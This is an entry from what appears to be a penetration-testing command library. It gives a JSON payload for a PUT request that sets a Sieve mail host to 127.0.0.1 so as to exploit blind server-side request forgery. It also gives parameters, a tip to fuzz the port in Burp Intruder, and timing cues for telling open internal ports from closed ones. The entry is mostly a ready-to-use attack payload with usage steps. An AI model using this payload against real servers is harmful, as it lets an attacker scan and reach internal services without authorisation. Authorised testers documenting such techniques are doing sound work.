---
id: cmd-json-ssrf-localhost
data: >-
  {"sieveEnabled":true,"sieveHost":"127.0.0.1","sievePort":"80","sieveUser":"","sievePassword":"","sieveSslMode":"none"}
tags:
  - ssrf
  - json-payload
type: command
output: 'Response time: <100ms (closed) or >5000ms (open port)'
executor: json
platforms:
  - Web
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T04:39:09.872Z'
verified: false
validated: true
submitted: true
---
# JSON-Payload-SSRF-Localhost

## Command

```json
{"sieveEnabled":true,"sieveHost":"127.0.0.1","sievePort":"80","sieveUser":"","sievePassword":"","sieveSslMode":"none"}
```

## Description

JSON payload for the PUT request to exploit Blind SSRF by targeting localhost on a specific port, used in Burp to test internal connectivity.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| sieveHost | Internal target (127.0.0.1) | Yes |
| sievePort | Port to test (e.g., 80) | Yes |
| sieveSslMode | 'none' for non-SSL | Yes |

## Examples

### Basic Usage

```json
{"sieveHost":"127.0.0.1","sievePort":"80","sieveSslMode":"none"}
```

### Advanced Usage

Fuzz sievePort in Burp Intruder for scanning.

## Expected Output

Server response with timing indicating port status: quick for closed, delayed for open services.

## Related

- [[commands/PUT-Sieve-Account-Update]]
- [[procedures/Fuzz-Ports-with-Burp-Intruder-for-Blind-Scanning]]
